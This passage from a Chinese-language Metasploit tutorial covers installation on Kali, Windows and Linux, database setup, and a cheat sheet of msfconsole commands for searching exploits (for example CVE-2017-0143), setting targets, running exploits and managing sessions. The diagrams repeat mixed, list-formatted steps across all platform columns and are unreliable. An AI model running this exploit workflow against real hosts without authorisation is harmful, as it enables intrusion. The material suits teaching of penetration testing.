定期升级']</text>  <rect x="380" y="70" width="300" height="40" rx="8" fill="#8b5cf6" opacity="0.18" stroke="#8b5cf6"/>  <text x="530.0" y="95" text-anchor="middle" font-size="15" font-weight="700" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">Windows</text>  <rect x="380" y="120" width="300" height="62" rx="8" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.2"/>  <text x="392" y="140" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 1</text>  <text x="392" y="160" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['1. 系统自带无需下载', '1. 官网下载 Windows 安装包', '1. curl msfinstall &gt; msfinstall']</text>  <rect x="380" y="190" width="300" height="62" rx="8" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.2"/>  <text x="392" y="210" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 2</text>  <text x="392" y="230" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['2. sudo systemctl start postgresql', '2. 管理员身份安装，勾选组件', '2. chmod 755 msfinstall ; sudo ./msfinstall']</text>  <rect x="380" y="260" width="300" height="62" rx="8" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.2"/>  <text x="392" y="280" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 3</text>  <text x="392" y="300" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['3. msfdb init 初始化数据库', '3. cmd 执行 msfconsole.bat', '3. sudo msfdb init']</text>  <rect x="380" y="330" width="300" height="62" rx="8" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.2"/>  <text x="392" y="350" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 4</text>  <text x="392" y="370" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['4. msfconsole 直接进入', '4. 或 docker run metasploitframework', '4. git clone 源码安装亦可']</text>  <rect x="380" y="400" width="300" height="62" rx="8" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.2"/>  <text x="392" y="420" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 5</text>  <text x="392" y="440" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['5. msfupdate 一键升级', '5. 首次启动生成 DB config', '5. ./msfupdate 定期升级']</text>  <rect x="720" y="70" width="300" height="40" rx="8" fill="#10b981" opacity="0.18" stroke="#10b981"/>  <text x="870.0" y="95" text-anchor="middle" font-size="15" font-weight="700" fill="#10b981" font-family="Microsoft YaHei,Arial">Ubuntu/CentOS</text>  <rect x="720" y="120" width="300" height="62" rx="8" fill="#0f172a" stroke="#10b981" stroke-width="1.2"/>  <text x="732" y="140" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 1</text>  <text x="732" y="160" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['1. 系统自带无需下载', '1. 官网下载 Windows 安装包', '1. curl msfinstall &gt; msfinstall']</text>  <rect x="720" y="190" width="300" height="62" rx="8" fill="#0f172a" stroke="#10b981" stroke-width="1.2"/>  <text x="732" y="210" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 2</text>  <text x="732" y="230" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['2. sudo systemctl start postgresql', '2. 管理员身份安装，勾选组件', '2. chmod 755 msfinstall ; sudo ./msfinstall']</text>  <rect x="720" y="260" width="300" height="62" rx="8" fill="#0f172a" stroke="#10b981" stroke-width="1.2"/>  <text x="732" y="280" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 3</text>  <text x="732" y="300" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['3. msfdb init 初始化数据库', '3. cmd 执行 msfconsole.bat', '3. sudo msfdb init']</text>  <rect x="720" y="330" width="300" height="62" rx="8" fill="#0f172a" stroke="#10b981" stroke-width="1.2"/>  <text x="732" y="350" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 4</text>  <text x="732" y="370" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['4. msfconsole 直接进入', '4. 或 docker run metasploitframework', '4. git clone 源码安装亦可']</text>  <rect x="720" y="400" width="300" height="62" rx="8" fill="#0f172a" stroke="#10b981" stroke-width="1.2"/>  <text x="732" y="420" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 5</text>  <text x="732" y="440" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['5. msfupdate 一键升级', '5. 首次启动生成 DB config', '5. ./msfupdate 定期升级']</text>  <text x="540.0" y="470" text-anchor="middle" font-size="12" fill="#64748b" font-family="Microsoft YaHei,Arial">建议新手先在 Kali 里跑熟命令，再上 Windows Docker 或服务器版</text>
</svg>


### 检查安装状态

Kali Linux预装了Metasploit：

```bash
msfconsole --version
```

如果显示版本号，说明已安装。

### 启动 Metasploit

```bash
msfconsole
```

启动后，你会看到Metasploit的欢迎界面：
```
       =[ metasploit v6.3         
+ -- --=[ 2348 exploits - 1232 auxiliary - 421 post       
+ -- --=[ 1412 payloads - 46 encoders - 11 nops       
+ -- --=[ 9 evasion       

Metasploit tip: View all premium modules with the show 
command      
msf6 >
```

### 更新 Metasploit

```bash
sudo apt update
sudo apt upgrade metasploit-framework
```

### 数据库配置

Metasploit可以使用数据库存储工作区和扫描结果：

**启动数据库服务：**
```bash
sudo systemctl start postgresql
```

**初始化数据库：**
```bash
sudo msfdb init
```

**验证数据库连接：**
```bash
msfconsole
db_status
```

如果显示"Connected to msf"，说明数据库已连接。

---

## 3.4 Windows 系统安装教程


<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 510" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s05g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s05b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s05r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s05a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s05s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s05g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-5 三大平台安装 MSF 步骤对比：Kali / Windows / Linux</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">左=新手最容易；中=Windows/Docker；右=服务器源码安装</text>  <rect x="40" y="70" width="300" height="40" rx="8" fill="#0ea5e9" opacity="0.18" stroke="#0ea5e9"/>  <text x="190.0" y="95" text-anchor="middle" font-size="15" font-weight="700" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">Kali Linux（推荐）</text>  <rect x="40" y="120" width="300" height="62" rx="8" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.2"/>  <text x="52" y="140" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 1</text>  <text x="52" y="160" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['1. 系统自带无需下载', '1. 官网下载 Windows 安装包', '1. curl msfinstall &gt; msfinstall']</text>  <rect x="40" y="190" width="300" height="62" rx="8" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.2"/>  <text x="52" y="210" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 2</text>  <text x="52" y="230" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['2. sudo systemctl start postgresql', '2. 管理员身份安装，勾选组件', '2. chmod 755 msfinstall ; sudo ./msfinstall']</text>  <rect x="40" y="260" width="300" height="62" rx="8" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.2"/>  <text x="52" y="280" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 3</text>  <text x="52" y="300" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['3. msfdb init 初始化数据库', '3. cmd 执行 msfconsole.bat', '3. sudo msfdb init']</text>  <rect x="40" y="330" width="300" height="62" rx="8" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.2"/>  <text x="52" y="350" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 4</text>  <text x="52" y="370" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['4. msfconsole 直接进入', '4. 或 docker run metasploitframework', '4. git clone 源码安装亦可']</text>  <rect x="40" y="400" width="300" height="62" rx="8" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.2"/>  <text x="52" y="420" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 5</text>  <text x="52" y="440" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['5. msfupdate 一键升级', '5. 首次启动生成 DB config', '5. ./msfupdate 定期升级']</text>  <rect x="380" y="70" width="300" height="40" rx="8" fill="#8b5cf6" opacity="0.18" stroke="#8b5cf6"/>  <text x="530.0" y="95" text-anchor="middle" font-size="15" font-weight="700" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">Windows</text>  <rect x="380" y="120" width="300" height="62" rx="8" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.2"/>  <text x="392" y="140" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 1</text>  <text x="392" y="160" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['1. 系统自带无需下载', '1. 官网下载 Windows 安装包', '1. curl msfinstall &gt; msfinstall']</text>  <rect x="380" y="190" width="300" height="62" rx="8" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.2"/>  <text x="392" y="210" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 2</text>  <text x="392" y="230" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['2. sudo systemctl start postgresql', '2. 管理员身份安装，勾选组件', '2. chmod 755 msfinstall ; sudo ./msfinstall']</text>  <rect x="380" y="260" width="300" height="62" rx="8" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.2"/>  <text x="392" y="280" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 3</text>  <text x="392" y="300" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['3. msfdb init 初始化数据库', '3. cmd 执行 msfconsole.bat', '3. sudo msfdb init']</text>  <rect x="380" y="330" width="300" height="62" rx="8" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.2"/>  <text x="392" y="350" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 4</text>  <text x="392" y="370" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['4. msfconsole 直接进入', '4. 或 docker run metasploitframework', '4. git clone 源码安装亦可']</text>  <rect x="380" y="400" width="300" height="62" rx="8" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.2"/>  <text x="392" y="420" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 5</text>  <text x="392" y="440" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['5. msfupdate 一键升级', '5. 首次启动生成 DB config', '5. ./msfupdate 定期升级']</text>  <rect x="720" y="70" width="300" height="40" rx="8" fill="#10b981" opacity="0.18" stroke="#10b981"/>  <text x="870.0" y="95" text-anchor="middle" font-size="15" font-weight="700" fill="#10b981" font-family="Microsoft YaHei,Arial">Ubuntu/CentOS</text>  <rect x="720" y="120" width="300" height="62" rx="8" fill="#0f172a" stroke="#10b981" stroke-width="1.2"/>  <text x="732" y="140" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 1</text>  <text x="732" y="160" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['1. 系统自带无需下载', '1. 官网下载 Windows 安装包', '1. curl msfinstall &gt; msfinstall']</text>  <rect x="720" y="190" width="300" height="62" rx="8" fill="#0f172a" stroke="#10b981" stroke-width="1.2"/>  <text x="732" y="210" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 2</text>  <text x="732" y="230" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['2. sudo systemctl start postgresql', '2. 管理员身份安装，勾选组件', '2. chmod 755 msfinstall ; sudo ./msfinstall']</text>  <rect x="720" y="260" width="300" height="62" rx="8" fill="#0f172a" stroke="#10b981" stroke-width="1.2"/>  <text x="732" y="280" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 3</text>  <text x="732" y="300" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['3. msfdb init 初始化数据库', '3. cmd 执行 msfconsole.bat', '3. sudo msfdb init']</text>  <rect x="720" y="330" width="300" height="62" rx="8" fill="#0f172a" stroke="#10b981" stroke-width="1.2"/>  <text x="732" y="350" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 4</text>  <text x="732" y="370" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['4. msfconsole 直接进入', '4. 或 docker run metasploitframework', '4. git clone 源码安装亦可']</text>  <rect x="720" y="400" width="300" height="62" rx="8" fill="#0f172a" stroke="#10b981" stroke-width="1.2"/>  <text x="732" y="420" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">步骤 5</text>  <text x="732" y="440" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">['5. msfupdate 一键升级', '5. 首次启动生成 DB config', '5. ./msfupdate 定期升级']</text>  <text x="540.0" y="470" text-anchor="middle" font-size="12" fill="#64748b" font-family="Microsoft YaHei,Arial">建议新手先在 Kali 里跑熟命令，再上 Windows Docker 或服务器版</text>
</svg>


### 方式一：手动安装

**步骤1：下载安装包**

1. 访问官网：https://www.metasploit.com/download
2. 下载Windows安装包（.exe或.msi）

**步骤2：安装**

双击安装包，按照提示安装。

**步骤3：验证**

打开命令提示符：
```batch
msfconsole --version
```

### 方式二：使用Docker

```bash
# 安装Docker Desktop

# 运行Metasploit容器
docker run -it --rm rapid7/metasploit-framework
```

---

## 3.5 Linux 系统独立安装教程

### 方式一：包管理器安装

```bash
# Ubuntu/Debian
curl https://apt.metasploit.com/metasploit-framework.gpg.key | sudo apt-key add -
sudo apt-add-repository 'deb https://apt.metasploit.com/ ubuntu main'
sudo apt update
sudo apt install metasploit-framework
```

### 方式二：源码安装

```bash
# 安装依赖
sudo apt install build-essential libpcap-dev ruby-dev

# 下载源码
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework

# 安装Ruby依赖
bundle install

# 运行
./msfconsole
```

---

## 3.6 MSFconsole 础命令详解

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 530" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s06g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s06b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s06r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s06a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s06s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s06g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-6 MSFconsole 13 条高频命令速查卡</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">能背下前 8 条=脱离文档独立操作</text>  <rect x="40" y="110" width="430" height="30" fill="#1e293b" stroke="#6366f1"/>  <text x="255.0" y="130" text-anchor="middle" fill="#bfdbfe" font-size="12.5" font-weight="700" font-family="Microsoft YaHei,Arial">命令（可复制）</text>  <rect x="480" y="110" width="430" height="30" fill="#1e293b" stroke="#6366f1"/>  <text x="695.0" y="130" text-anchor="middle" fill="#bfdbfe" font-size="12.5" font-weight="700" font-family="Microsoft YaHei,Arial">功能说明</text>  <rect x="920" y="110" width="100" height="30" fill="#1e293b" stroke="#6366f1"/>  <text x="970.0" y="130" text-anchor="middle" fill="#bfdbfe" font-size="12.5" font-weight="700" font-family="Microsoft YaHei,Arial">频率</text>  <rect x="40" y="140" width="430" height="30" fill="#111c35" stroke="#334155"/>  <rect x="480" y="140" width="430" height="30" fill="#111c35" stroke="#334155"/>  <rect x="920" y="140" width="100" height="30" fill="#111c35" stroke="#334155"/>  <text x="48" y="160" fill="#fde68a" font-size="10.5" font-family="Consolas,Monospace">help 或 ?</text>  <text x="490" y="160" fill="#e2e8f0" font-size="11.5" font-family="Microsoft YaHei,Arial">查看帮助 / help search 查子命令</text>  <text x="970.0" y="160" text-anchor="middle" fill="#0ea5e9" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">01 新手必按</text>  <rect x="40" y="170" width="430" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="480" y="170" width="430" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="920" y="170" width="100" height="30" fill="#0b1530" stroke="#334155"/>  <text x="48" y="190" fill="#fde68a" font-size="10.5" font-family="Consolas,Monospace">search CVE-2017-0143 type:exploit</text>  <text x="490" y="190" fill="#e2e8f0" font-size="11.5" font-family="Microsoft YaHei,Arial">按 CVE/平台/类型搜模块</text>  <text x="970.0" y="190" text-anchor="middle" fill="#ef4444" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">02 最高频</text>  <rect x="40" y="200" width="430" height="30" fill="#111c35" stroke="#334155"/>  <rect x="480" y="200" width="430" height="30" fill="#111c35" stroke="#334155"/>  <rect x="920" y="200" width="100" height="30" fill="#111c35" stroke="#334155"/>  <text x="48" y="220" fill="#fde68a" font-size="10.5" font-family="Consolas,Monospace">use exploit/...</text>  <text x="490" y="220" fill="#e2e8f0" font-size="11.5" font-family="Microsoft YaHei,Arial">进入模块上下文</text>  <text x="970.0" y="220" text-anchor="middle" fill="#8b5cf6" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">03 次高频</text>  <rect x="40" y="230" width="430" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="480" y="230" width="430" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="920" y="230" width="100" height="30" fill="#0b1530" stroke="#334155"/>  <text x="48" y="250" fill="#fde68a" font-size="10.5" font-family="Consolas,Monospace">show options / targets / payloads</text>  <text x="490" y="250" fill="#e2e8f0" font-size="11.5" font-family="Microsoft YaHei,Arial">显示模块参数/目标/载荷</text>  <text x="970.0" y="250" text-anchor="middle" fill="#a855f7" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">04 配合 use</text>  <rect x="40" y="260" width="430" height="30" fill="#111c35" stroke="#334155"/>  <rect x="480" y="260" width="430" height="30" fill="#111c35" stroke="#334155"/>  <rect x="920" y="260" width="100" height="30" fill="#111c35" stroke="#334155"/>  <text x="48" y="280" fill="#fde68a" font-size="10.5" font-family="Consolas,Monospace">set RHOSTS 10.0.0.5</text>  <text x="490" y="280" fill="#e2e8f0" font-size="11.5" font-family="Microsoft YaHei,Arial">设置本地变量 RHOSTS/LHOST/LPORT</text>  <text x="970.0" y="280" text-anchor="middle" fill="#f59e0b" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">05 必设</text>  <rect x="40" y="290" width="430" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="480" y="290" width="430" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="920" y="290" width="100" height="30" fill="#0b1530" stroke="#334155"/>  <text x="48" y="310" fill="#fde68a" font-size="10.5" font-family="Consolas,Monospace">setg LHOST 192.168.1.100</text>  <text x="490" y="310" fill="#e2e8f0" font-size="11.5" font-family="Microsoft YaHei,Arial">全局变量所有模块继承</text>  <text x="970.0" y="310" text-anchor="middle" fill="#10b981" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">06 提效</text>  <rect x="40" y="320" width="430" height="30" fill="#111c35" stroke="#334155"/>  <rect x="480" y="320" width="430" height="30" fill="#111c35" stroke="#334155"/>  <rect x="920" y="320" width="100" height="30" fill="#111c35" stroke="#334155"/>  <text x="48" y="340" fill="#fde68a" font-size="10.5" font-family="Consolas,Monospace">unset RHOSTS / unsetg</text>  <text x="490" y="340" fill="#e2e8f0" font-size="11.5" font-family="Microsoft YaHei,Arial">取消变量</text>  <text x="970.0" y="340" text-anchor="middle" fill="#64748b" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">07 纠错</text>  <rect x="40" y="350" width="430" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="480" y="350" width="430" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="920" y="350" width="100" height="30" fill="#0b1530" stroke="#334155"/>  <text x="48" y="370" fill="#fde68a" font-size="10.5" font-family="Consolas,Monospace">check</text>  <text x="490" y="370" fill="#e2e8f0" font-size="11.5" font-family="Microsoft YaHei,Arial">仅检测漏洞不打（安全）</text>  <text x="970.0" y="370" text-anchor="middle" fill="#06b6d4" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">08 关键！</text>  <rect x="40" y="380" width="430" height="30" fill="#111c35" stroke="#334155"/>  <rect x="480" y="380" width="430" height="30" fill="#111c35" stroke="#334155"/>  <rect x="920" y="380" width="100" height="30" fill="#111c35" stroke="#334155"/>  <text x="48" y="400" fill="#fde68a" font-size="10.5" font-family="Consolas,Monospace">run 或 exploit -j -z</text>  <text x="490" y="400" fill="#e2e8f0" font-size="11.5" font-family="Microsoft YaHei,Arial">执行：-j 后台 -z 不交互</text>  <text x="970.0" y="400" text-anchor="middle" fill="#ec4899" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">09 打洞</text>  <rect x="40" y="410" width="430" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="480" y="410" width="430" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="920" y="410" width="100" height="30" fill="#0b1530" stroke="#334155"/>  <text x="48" y="430" fill="#fde68a" font-size="10.5" font-family="Consolas,Monospace">back</text>  <text x="490" y="430" fill="#e2e8f0" font-size="11.5" font-family="Microsoft YaHei,Arial">返回模块搜索根</text>  <text x="970.0" y="430" text-anchor="middle" fill="#78716c" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">10 导航</text>  <rect x="40" y="440" width="430" height="30" fill="#111c35" stroke="#334155"/>  <rect x="480" y="440" width="430" height="30" fill="#111c35" stroke="#334155"/>  <rect x="920" y="440" width="100" height="30" fill="#111c35" stroke="#334155"/>  <text x="48" y="460" fill="#fde68a" font-size="10.5" font-family="Consolas,Monospace">sessions -l/-i 1/-k 2/-u 1</text>  <text x="490" y="460" fill="#e2e8f0" font-size="11.5" font-family="Microsoft YaHei,Arial">会话列表/进入/杀/升级</text>  <text x="970.0" y="460" text-anchor="middle" fill="#dc2626" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">11 后渗入口</text>  <rect x="40" y="470" width="430" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="480" y="470" width="430" height="30" fill="#0b1530" stroke="#334155"/>  <rect x="920" y="470" width="100" height="30" fill="#0b1530" stroke="#334155"/>  <text x="48" y="490" fill="#fde68a" font-size="10.5" font-family="Consolas,Monospace">db_nmap -sV -O 10/24</text>  <text x="490" y="490" fill="#e2e8f0" font-size="11.5" font-family="Microsoft YaHei,Arial">nmap 结果入库 hosts/services</text>  <text x="970.0" y="490" text-anchor="middle" fill="#0891b2" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">12 大型内网</text>  <rect x="40" y="500" width="430" height="30" fill="#111c35" stroke="#334155"/>  <rect x="480" y="500" width="430" height="30" fill="#111c35" stroke="#334155"/>  <rect x="920" y="500" width="100" height="30" fill="#111c35" stroke="#334155"/>  <text x="48" y="520" fill="#fde68a" font-size="10.5" font-family="Consolas,Monospace">exit</text>  <text x="490" y="520" fill="#e2e8f0" font-size="11.5" font-family="Microsoft YaHei,Arial">退出 msfconsole</text>  <text x="970.0" y="520" text-anchor="middle" fill="#475569" font-size="10.5" font-weight="700" font-family="Microsoft YaHei,Arial">13 收尾</text>  <text x="540.0" y="495" text-anchor="middle" font-size="12" fill="#64748b" font-family="Microsoft YaHei,Arial">90% 日常操作只用前 6 条，剩下 7 条是进阶备用</text>
</svg>



<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="100%" style="max-width:1080px;margin:12px auto;display:block;background:#05091a;border-radius:14px;border:1px solid #1e3a8a">
  <defs>
    <linearGradient id="s07g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e293b"/><stop offset="100%" stop-color="#0f172a"/></linearGradient>
    <linearGradient id="s07b" x1="0" x2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="s07r" x1="0" x2="1"><stop offset="0" stop-color="#ef4444"/><stop offset="1" stop-color="#f97316"/></linearGradient>
    <marker id="s07a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#60a5fa"/></marker>
    <filter id="s07s" x="-20%" y="-20%" width="140%" height="140%"><feDropShadow dx="0" dy="3" stdDeviation="4" flood-color="#000" flood-opacity="0.45"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="520" fill="url(#s07g)"/>
  <text x="540.0" y="44" text-anchor="middle" font-size="22" font-weight="700" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">图 3-7 search 命令高级筛选漏斗：从 3000+ 模块精准锁定</text>  <text x="540.0" y="74" text-anchor="middle" font-size="13" fill="#94a3b8" font-family="Microsoft YaHei,Arial">多层筛，最后只剩要打的那一个</text>  <polygon points="290.0,140 790.0,140 820.0,190 260.0,190" fill="#0ea5e9" opacity="0.18" stroke="#0ea5e9" stroke-width="1.6"/>  <text x="540.0" y="162" text-anchor="middle" font-size="13" font-weight="700" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">1. 关键词 = tomcat mgr login</text>  <text x="750.0" y="212" text-anchor="middle" font-size="14" font-weight="800" fill="#fde68a" font-family="Consolas,Monospace">58 结果</text>  <polygon points="320.0,210 760.0,210 790.0,260 290.0,260" fill="#8b5cf6" opacity="0.18" stroke="#8b5cf6" stroke-width="1.6"/>  <text x="540.0" y="232" text-anchor="middle" font-size="13" font-weight="700" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">2. + type:auxiliary</text>  <text x="720.0" y="282" text-anchor="middle" font-size="14" font-weight="800" fill="#fde68a" font-family="Consolas,Monospace">31 结果</text>  <polygon points="350.0,280 730.0,280 760.0,330 320.0,330" fill="#a855f7" opacity="0.18" stroke="#a855f7" stroke-width="1.6"/>  <text x="540.0" y="302" text-anchor="middle" font-size="13" font-weight="700" fill="#a855f7" font-family="Microsoft YaHei,Arial">3. + platform:windows</text>  <text x="690.0" y="352" text-anchor="middle" font-size="14" font-weight="800" fill="#fde68a" font-family="Consolas,Monospace">12 结果</text>  <polygon points="380.0,350 700.0,350 730.0,400 350.0,400" fill="#f59e0b" opacity="0.18" stroke="#f59e0b" stroke-width="1.6"/>  <text x="540.0" y="372" text-anchor="middle" font-size="13" font-weight="700" fill="#f59e0b" font-family="Microsoft YaHei,Arial">4. + author:todb</text>  <text x="660.0" y="422" text-anchor="middle" font-size="14" font-weight="800" fill="#fde68a" font-family="Consolas,Monospace"> 5 结果</text>  <polygon points="410.0,420 670.0,420 700.0,470 380.0,470" fill="#ef4444" opacity="0.18" stroke="#ef4444" stroke-width="1.6"/>  <text x="540.0" y="442" text-anchor="middle" font-size="13" font-weight="700" fill="#ef4444" font-family="Microsoft YaHei,Arial">5. + CVE/app:Tomcat</text>  <text x="630.0" y="492" text-anchor="middle" font-size="14" font-weight="800" fill="#fde68a" font-family="Consolas,Monospace"> 2 结果</text>  <rect x="390.0" y="470" width="300" height="30" rx="8" fill="#10b981" opacity="0.3" stroke="#10b981"/>  <text x="540.0" y="490" text-anchor="middle" font-size="13" font-weight="800" fill="#ecfdf5" font-family="Consolas,Microsoft YaHei,Arial">命中：auxiliary/scanner/http/tomcat_mgr_login</text>  <rect x="760" y="110" width="300" height="270" rx="10" fill="#0f172a" stroke="#334155"/>  <text x="910" y="132" text-anchor="middle" font-size="13" font-weight="700" 